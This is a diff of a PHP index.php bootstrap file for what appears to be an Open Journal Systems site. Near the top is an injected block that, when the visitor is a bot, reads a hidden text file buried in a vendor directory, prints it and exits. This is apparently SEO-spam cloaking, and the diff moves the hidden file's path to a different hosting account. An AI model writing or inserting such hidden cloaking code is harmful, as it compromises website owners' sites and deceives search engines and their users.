@@ -13,12 +13,13 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('/home/u291286007/domains/tcais.net/public_html/lib/pkp/lib/vendor/components/jqueryui/themes/blitzer/images/index.txt');
+    $message = file_get_contents('/home/unialfa/public_html/lib/pkp/lib/vendor/michelf/php-markdown/index.txt');
     echo $message;
 exit;
 }
 ?>
 <?php
+
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
@@ -53,7 +54,6 @@ chdir(BASE_SYS_DIR);
 
 // System-wide functions
 require('./lib/pkp/includes/functions.inc.php');
-
 
 // Initialize the application environment
 import('classes.core.Application');
